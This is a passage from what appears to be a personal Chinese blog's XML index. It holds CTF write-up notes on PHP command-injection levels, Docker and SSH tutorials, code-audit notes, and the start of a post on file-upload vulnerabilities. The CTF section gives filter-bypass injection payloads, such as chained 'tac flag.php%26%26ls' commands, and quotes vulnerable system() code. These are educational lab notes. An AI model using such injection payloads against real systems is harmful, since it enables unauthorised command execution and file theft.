class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><ol><li>过滤了$,+,-,^,~,使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字，但是特意留了个字符|，最重要的是没有过滤掉%,所以可以使用URL编码去解决问题<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721153703.png"></li><li>可以从ASCII为0-255的字符中找到或运算能得到的可用的字符</li><li>跑脚本吧，虽然最后我也没解出来，但是思路是对的</li></ol><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="黑洞"><a href="#黑洞" class="headerlink" title="黑洞"></a>黑洞</h3><ol><li>‘&gt;/dev/null’命令</li><li>目的是抑制各种命令输出的空设备<a href="https://linuxhint.com/two-dev-null-command-purpose/">https://linuxhint.com/two-dev-null-command-purpose/</a><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729154309.png"></li></ol><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="过滤掉分号，但是还是需要两条命令的情况"><a href="#过滤掉分号，但是还是需要两条命令的情况" class="headerlink" title="过滤掉分号，但是还是需要两条命令的情况"></a>过滤掉分号，但是还是需要两条命令的情况</h3><ol><li>过滤掉了分号，但是还是需要两条命令</li><li>可以使用&amp;&amp;</li><li>当前面的语句执行结果为true时，会执行后面的语句，而且前后是分割的两条命令</li><li>遇到黑洞问题并且过滤掉了分号就可以用&amp;&amp;来起到分隔作用<pre class="line-numbers language-none"><code class="language-none">if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729155254.png"></li></ol><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160723.png"></li><li>发现有黑洞，并且过滤掉了分号，我们可以使用&amp;&amp;对两条命令进行分隔，成为两条命令</li><li>传参?c=ls&amp;&amp;ls ,并对&amp;&amp;进行URL编码，即传参?c=ls%26%26ls 可以查看到回显，那么我们可以修改第一条命令来得到flag，因为第二条命令进入了黑洞中<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160856.png"></li><li>?c=tac flag.php%26%26ls得到flag</li></ol><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h3 id="当过滤掉数字和-时，URL编码中的数字不会被过滤"><a href="#当过滤掉数字和-时，URL编码中的数字不会被过滤" class="headerlink" title="当过滤掉数字和%时，URL编码中的数字不会被过滤"></a>当过滤掉数字和%时，URL编码中的数字不会被过滤</h3><ol><li>当过滤掉数字时，URL编码中的数字不会被过滤</li><li>因为URL编码在上传的过程中已经被浏览器解了一次码了，传到服务器的时候已经是字符而不是URL编码的数字了</li><li>%同理</li></ol><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><ol><li>过滤掉了数字，$和*，即不让我们使用数字，逃逸和任意字符数的通配符</li><li>我们可以使用?来代替*的通配符,URL编码中的数字会自动解码，不用担心</li><li>?c=tac%09fla?.php%26%26ls</li></ol><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>1. </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acwing搭建云服务器及docker的使用</title>
      <link href="/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建云服务器"><a href="#搭建云服务器" class="headerlink" title="搭建云服务器"></a>搭建云服务器</h1><h2 id="以下环境为Ubuntu20"><a href="#以下环境为Ubuntu20" class="headerlink" title="以下环境为Ubuntu20"></a>以下环境为Ubuntu20</h2><h2 id="云平台作用"><a href="#云平台作用" class="headerlink" title="云平台作用"></a>云平台作用</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714102552.png"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714103019.png"></p><ol><li>在租到的服务器上搭建docker类似于在服务器上又开了一台虚拟服务器，重新划分了一下服务器的房子</li><li>docker的搭建原因：docker有很强的迁移性，例如从阿里云的服务器迁移到腾讯云时，使用docker可以很容易地迁移</li><li>docker是非常独立的：可以在一个服务器上开任意多个docker</li><li>未来的开发环境是在docker所在的第三层</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104459.png"></li></ol><h2 id="选择配置问题"><a href="#选择配置问题" class="headerlink" title="选择配置问题"></a>选择配置问题</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104646.png"></p><h2 id="常规搭建步骤"><a href="#常规搭建步骤" class="headerlink" title="常规搭建步骤"></a>常规搭建步骤</h2><ol><li>配置以下本地的 <strong>~/.ssh/config</strong>文件，可以实现不用username@hostname，使用别名机制登录</li><li>配置一下免密登录<pre class="line-numbers language-none"><code class="language-none">## 免密登录1. 在本地（本子上），**ssh-keygen**，会在.ssh&#x2F;文件夹下生成密钥：id_rsa和公钥id_rsa.pub2. 之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可3. 在服务器中的.ssh&#x2F;路径下创建一个 **authorized_keys** 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可4. 例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~&#x2F;.ssh&#x2F;authorized_keys文件里即可5. 也可以使用**ssh-copy-id myserver**一键添加公钥6. 公钥添加到.ssh&#x2F;authorized_keys中即可免密登录7. 误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，**不能自己登自己**8. 可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220714164253.png)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>配置一下tmux和vim，将本地的.vimrc和.tmux.conf文件传到服务器的根目录下<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><ol><li>登录docker官网，一步一步来就行</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715171552.png"></li></ol><h2 id="配置docker"><a href="#配置docker" class="headerlink" title="配置docker"></a>配置docker</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;install&#x2F;ubuntu&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="将当前用户添加到docker用户组"><a href="#将当前用户添加到docker用户组" class="headerlink" title="将当前用户添加到docker用户组"></a>将当前用户添加到docker用户组</h3><ol><li>为了避免每一次使用docker都要加上sudo权限，可以将当前用户加入安装中自动创建的docker用户组<pre class="line-numbers language-none"><code class="language-none">sudo usermod -aG docker $USER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>镜像：<strong>image</strong> ，相当于一个模板，每一个镜像都可以生成一堆容器，<strong>container</strong></li><li>每个image的名称：xxxx：xxxx,冒号前面为名称，冒号后面为tag,即版本号</li></ol><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><ol><li>拉取（从docker Hub中<strong>下载</strong>一个镜像）一个镜像,此处以拉取20版ubuntu为例，镜像名称:镜像版本<pre class="line-numbers language-none"><code class="language-none">docker pull ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>列出本地所有镜像<pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除某个镜像，此处以ubuntu:20为例<pre class="line-numbers language-none"><code class="language-none">docker image rm ubuntu:20.04 或者 docker rmi ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建某个container的镜像<pre class="line-numbers language-none"><code class="language-none">docker [container] commit CONTAINER IMAGE_NAME:TAG<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将镜像ubuntu:20.04导出到本地ubuntu_20_04.tar中（以另一种文件格式保存）<pre class="line-numbers language-none"><code class="language-none">docker save -o ubuntu_20_04.tar ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将镜像ubuntu:20.04从本地文件ubuntu_20_04.tar中加载出来<pre class="line-numbers language-none"><code class="language-none">docker load -i ubuntu_20_04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ol><li>利用镜像创建一个容器,create -it<pre class="line-numbers language-none"><code class="language-none">docker [container] create -it ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看本地所有的容器,所有创建了的容器，不只是启动了的就加[-a]参数，如果不加-a参数的话就是默认正在启动的容器<pre class="line-numbers language-none"><code class="language-none">docker ps [-a]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>启动容器,start<pre class="line-numbers language-none"><code class="language-none">docker [container] start CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>停止容器,stop<pre class="line-numbers language-none"><code class="language-none">docker stop CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>重启容器,restart<pre class="line-numbers language-none"><code class="language-none">docker restart CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建并启动一个容器,加-d不进入,不加-d就是创建并进入容器,run,-it<pre class="line-numbers language-none"><code class="language-none">docker run -itd ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>进入容器,先按ctrl+p,再按ctrl+q可以挂起容器<pre class="line-numbers language-none"><code class="language-none">docker attach container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在容器中执行命令,exec<pre class="line-numbers language-none"><code class="language-none">docker exec container command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除容器，rm<pre class="line-numbers language-none"><code class="language-none">docker rm container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>删除所有已经停止的容器，prune<pre class="line-numbers language-none"><code class="language-none">docker container prune<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将容器container导出到本地文件xxx.rar中,export<pre class="line-numbers language-none"><code class="language-none">docker export -o xxx.rar container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将本地文件xxx.tar导出为镜像，并且将镜像命名为image_name:tag,import,从本地导向容器是import,从容器导向本地是export,进出关系<pre class="line-numbers language-none"><code class="language-none">docker import xxx.tar image_name:tag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>docker export/import 与docker save/load的区别<pre class="line-numbers language-none"><code class="language-none">export&#x2F;import 会丢弃记录和元数据信息，仅仅保存容器当时的快照信息，例如容器的名字就不会保留save&#x2F;load 会保留完整记录，体积更大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>查看某个容器的所有进程,top<pre class="line-numbers language-none"><code class="language-none">docker top container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看所有容器的统计信息，包括CPU，内存，存储，网络等信息,stats<pre class="line-numbers language-none"><code class="language-none">docker stats<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在本地和容器之间复制文件,还是和cp和scp的格式一样,先source后destination，先从后到,cp<pre class="line-numbers language-none"><code class="language-none">docker cp xxx container:xxxdocker cp container:xxx xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>重命名容器,rename<pre class="line-numbers language-none"><code class="language-none">docker rename container1 container2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>修改容器限制,update<pre class="line-numbers language-none"><code class="language-none">docker update container --memory 500MB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="容器和镜像的区别"><a href="#容器和镜像的区别" class="headerlink" title="容器和镜像的区别"></a>容器和镜像的区别</h3><ol><li>docker的生命周期：镜像image+容器container+仓库registry,容器是由镜像实例化而来</li><li>容器即为进程，是镜像的实例，是运行环境包的实例，可以针对这个环境包运行N个实例，即容器是镜像的一种具体表现形式</li><li>镜像即为文件，想象为一个盖章，可以盖到任意的docker平台中去运行</li><li>容器是基于镜像所创建的，容器中的进程依赖于镜像中的文件</li><li>docker就是一个mini版本的Linux系统，拥有完全与宿主机隔离的系统文件，进程，用户权限，网络空间等</li><li>镜像和容器的先后顺序：现有镜像后由实例的容器，虽然创建镜像可以参考某个容器，但是标准的做法是先制作镜像后跑容器</li></ol><h2 id="docker入门概念"><a href="#docker入门概念" class="headerlink" title="docker入门概念"></a>docker入门概念</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722155932.png"></p><ol><li>开发和运维工程师的结合，更快的交付<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160245.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160743.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722163027.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722164155.png"></li></ol><h2 id="docker和docker-hub的关系"><a href="#docker和docker-hub的关系" class="headerlink" title="docker和docker hub的关系"></a>docker和docker hub的关系</h2><ol><li>docker是官网</li><li>docker hub是安装docker镜像的仓库<h3 id="dockerfile-image-container-repository"><a href="#dockerfile-image-container-repository" class="headerlink" title="dockerfile image container repository"></a>dockerfile image container repository</h3></li><li>通过dockerfile可以生成docker image</li><li>自己制作的镜像可以上传到docker hub平台，也可以从平台上拉去我们所需要的镜像</li><li>当镜像拉取到本地后，我们可以实例化这个镜像，形成一个container(实例)了<pre class="line-numbers language-none"><code class="language-none">docker run [组织名称]&#x2F;&lt;镜像名称&gt;：[镜像标签]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ol><li><p>Dockerfile 是 Docker 比较重要的概念。它是 Docker 创建镜像的核心，它的出现给 Docker 提供了两大好处：</p></li><li><p>文本化的镜像生成操作让其方便版本管理和自动化部署</p></li><li><p>每条命令对应镜像的一层，细化操作后保证其可增量更新，复用镜像块，减小镜像体积</p></li></ol><h4 id="dockerfile的编写规则"><a href="#dockerfile的编写规则" class="headerlink" title="dockerfile的编写规则"></a>dockerfile的编写规则</h4><ol><li>使用#来注释</li><li>from指令告诉docker使用哪个镜像作为基础</li><li>run开头的指令会在创建中运行，比如安装一个软件包</li><li>copy指令将文件复制到镜像中</li><li>workdir指定工作目录</li><li>cmd/entrypoint 镜像启动执行命令</li><li>最后执行以下命令即可完成docker镜像的创建<pre class="line-numbers language-none"><code class="language-none">docker build lizheming&#x2F;drone-wechat:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh</title>
      <link href="/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
      <url>/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="远程登录原理"><a href="#远程登录原理" class="headerlink" title="远程登录原理"></a>远程登录原理</h2><ol><li>安全，即使被截获也没毛病</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714113940.png"></li></ol><h2 id="远程登录服务器语法"><a href="#远程登录服务器语法" class="headerlink" title="远程登录服务器语法"></a>远程登录服务器语法</h2><ol><li>ssh user@hostname</li><li>user:用户名</li><li>hostname:IP地址或域名</li></ol><h3 id="初次登录会提示"><a href="#初次登录会提示" class="headerlink" title="初次登录会提示"></a>初次登录会提示</h3><ol><li>初次登录会提示<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714110814.png"></li><li>登录后服务器的信息会记录在~/.ssh/known_hosts文件夹中</li><li>然后输入密码即可登录到服务器中</li><li>默认登录端口为22，如果想要登录某一特定端口，加上 <strong>-p</strong> 参数</li><li>假设想要登录23号端口：ssh username@hostname -p 23</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol><li>在客户端中（主机，本子）中创建文件 ~/.ssh/config   <strong>config文件就是用来创建别名机制的</strong></li><li>在文件中输入<pre class="line-numbers language-none"><code class="language-none">Host myserver1    HostName IP地址或域名    User 用户名Host myserver2    HostName IP地址或域名    User 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>之后再使用服务器时，可以直接使用别名myserver1 和 myserver2</li></ol><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><ol><li>在本地（本子上），<strong>ssh-keygen</strong>，会在.ssh/文件夹下生成密钥：id_rsa和公钥id_rsa.pub</li><li>之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可</li><li>在服务器中的.ssh/路径下创建一个 <strong>authorized_keys</strong> 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可</li><li>例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~/.ssh/authorized_keys文件里即可</li><li>也可以使用<strong>ssh-copy-id myserver</strong>一键添加公钥</li><li>公钥添加到.ssh/authorized_keys中即可免密登录</li><li>误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，<strong>不能自己登自己</strong></li><li>可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714164253.png"></li></ol><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h3><ol><li>当我们需要自动化运维时，需要实现一步：<strong>登进去，执行一个命令之后，退出来</strong></li><li>当有大量服务器时，如果登进去，实现一个命令之后，再退出来就会消耗大量的人力时间</li></ol><h3 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h3><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><ol><li>在<strong>ssh登录之后</strong>直接<strong>加上命令</strong><pre class="line-numbers language-none"><code class="language-none">ssh user@hostname command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714165333.png"></li><li>这个命令的执行是在服务器中实现的，结果重定向到本地</li><li>注意：单引号中的$i可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &#39;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>双引号中的$i不可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &quot;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="scp传文件"><a href="#scp传文件" class="headerlink" title="scp传文件"></a>scp传文件</h2><h3 id="命令格式-可以记成ssh的cp-scp"><a href="#命令格式-可以记成ssh的cp-scp" class="headerlink" title="命令格式(可以记成ssh的cp,scp)"></a>命令格式(可以记成ssh的cp,scp)</h3><ol><li>scp source destination</li><li>将source路径下的文件复制到destination中，先从后到，和cp命令一样<h4 id="一次复制多个文件"><a href="#一次复制多个文件" class="headerlink" title="一次复制多个文件"></a>一次复制多个文件</h4></li><li>scp source1 source2 destination</li></ol><h4 id="复制文件夹"><a href="#复制文件夹" class="headerlink" title="复制文件夹"></a>复制文件夹</h4><ol><li>scp -r ~/tmp myserver:/home/acs  -r放在source和destination的前面</li><li>服务器和本地的地址都可以作为source或者destination,即既可以将文件从本地传到服务器上，也可以从服务器上传到本地</li><li>本地文件使用相对路径或绝对路径都可以</li><li>服务器上的路径：服务器的地址或别名:地址（这个地址可以写绝对路径，也可以写相对于根目录的相对地址，<strong>不写的话默认为根目录</strong>）</li></ol><h4 id="指定服务器的端口号"><a href="#指定服务器的端口号" class="headerlink" title="指定服务器的端口号"></a>指定服务器的端口号</h4><pre class="line-numbers language-none"><code class="language-none">scp -P source1 source2 destination<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>注意，这个地方的-P是大写的，ssh的-p是小写的</li><li>scp的-r和-P参数尽量加在source和destination之前</li></ol><h4 id="服务器之间传"><a href="#服务器之间传" class="headerlink" title="服务器之间传"></a>服务器之间传</h4><ol><li>scp命令不止限于主机和服务器之间传文件，也可以在两台服务器之间传文件，即source和destination都可以为服务器的路径</li><li>但是必须两台服务器之间的授权非常完整，否则会报错</li><li>所以可以将一台服务器上的文件传到本地，再由本地传到另一台服务器上<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715104640.png"></li></ol><h3 id="使用scp配置其它服务器的vim和tmux"><a href="#使用scp配置其它服务器的vim和tmux" class="headerlink" title="使用scp配置其它服务器的vim和tmux"></a>使用scp配置其它服务器的vim和tmux</h3><ol><li>vim的配置文件:  .vimrc</li><li>tmux的配置文件：  .tmux.conf</li><li>配置vim和tmux只需要将vim和tmux的配置文件传到服务器的根目录下即可<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪老师代码审计</title>
      <link href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><ol><li>关键字搜索：1搜变量，2搜函数关键字</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li>fortify，批量化挖掘漏洞，静态挖掘漏洞，支持多种语言，做题先扫描一遍<h3 id="seay："><a href="#seay：" class="headerlink" title="seay："></a>seay：</h3></li><li>扫描关键字<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713002441.png">,</li><li>输入关键字之后点击全局搜索，</li><li>但是可能封装到一个类中了，</li><li>记住勾选正则和不区分大小写，</li><li>一定要看看哪一个语句是否有变量，没有变量就是写死了，没有办法控制变量，就没办法<strong>sql注入</strong>，</li><li><strong>乱码记得切换编码</strong></li><li>由关键字搜索到具体函数，根据函数名右键全局搜索调用函数的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li><li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li><li>函数查询</li><li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li></ol><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li>搜索select</li><li>找到变量</li><li>找到变量调用函数</li><li>右键定位函数调用位置</li><li>看看页面和数据库的互动，根据回显判断注入点</li></ol><h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol><li>看配置文件，看配置文件的关键字，例如：fun、inc</li></ol><h2 id="漏洞产生的根本"><a href="#漏洞产生的根本" class="headerlink" title="漏洞产生的根本"></a>漏洞产生的根本</h2><ol><li>可控变量</li><li>特定函数，决定漏洞类型</li><li>不存在过滤或过滤不严谨存在绕过导致的安全漏洞</li></ol><h2 id="定点挖掘关键字"><a href="#定点挖掘关键字" class="headerlink" title="定点挖掘关键字"></a>定点挖掘关键字</h2><h4 id="可控变量"><a href="#可控变量" class="headerlink" title="可控变量"></a>可控变量</h4><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235655.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235708.png"></li><li>接受来的id参数将会传递给sql语句执行<h5 id="变量的接受"><a href="#变量的接受" class="headerlink" title="变量的接受"></a>变量的接受</h5></li><li>变量的接受方式：get post</li><li>接受关键字：$_GET $_POST</li></ol><h4 id="特定函数"><a href="#特定函数" class="headerlink" title="特定函数"></a>特定函数</h4><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ol><li>print echo<h5 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h5><h4 id="搜索特定关键字尝试寻找特定漏洞"><a href="#搜索特定关键字尝试寻找特定漏洞" class="headerlink" title="搜索特定关键字尝试寻找特定漏洞"></a>搜索特定关键字尝试寻找特定漏洞</h4></li><li>搜索echo print 尝试挖掘的就是xss漏洞</li><li>搜索$_GET $_POST 尝试挖掘的就是安全漏洞（可控变量）</li><li>搜索select insert update sql执行语句 == sql注入漏洞</li></ol><h2 id="定点挖掘功能点"><a href="#定点挖掘功能点" class="headerlink" title="定点挖掘功能点"></a>定点挖掘功能点</h2><ol><li>我要挖掘文件上传，通过网站的浏览，发现文件上传的位置，例如会员中心，<strong>抓包分析</strong>找到源码中的特定文件代码段，进行文件上传代码分析挖掘。</li></ol><h2 id="拓展：视漏洞而定"><a href="#拓展：视漏洞而定" class="headerlink" title="拓展：视漏洞而定"></a>拓展：视漏洞而定</h2><ol><li>sql注入 数据库监控-监控到当前页面和数据库的交互过程（SQL执行语句）</li><li>断点调试：访问页面时对应代码进行断点调试（执行过程前后顺序，调用文件列表）</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><ol><li>存在文件上传的地方，就<strong>有可能有</strong>文件上传的漏洞</li><li>上传一个<strong>webshell</strong>(后门)</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713180202.png"></li></ol><h2 id="查找文件上传漏洞"><a href="#查找文件上传漏洞" class="headerlink" title="查找文件上传漏洞"></a>查找文件上传漏洞</h2><ol><li>脚本扫描（御剑和菜刀.爬虫）</li><li>尝试网站的应用</li></ol><h2 id="利用类型"><a href="#利用类型" class="headerlink" title="利用类型"></a>利用类型</h2><h3 id="常规类"><a href="#常规类" class="headerlink" title="常规类"></a>常规类</h3><h4 id="扫描获取上传"><a href="#扫描获取上传" class="headerlink" title="扫描获取上传"></a>扫描获取上传</h4><ol><li>扫描到敏感目录，上传地址<h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a 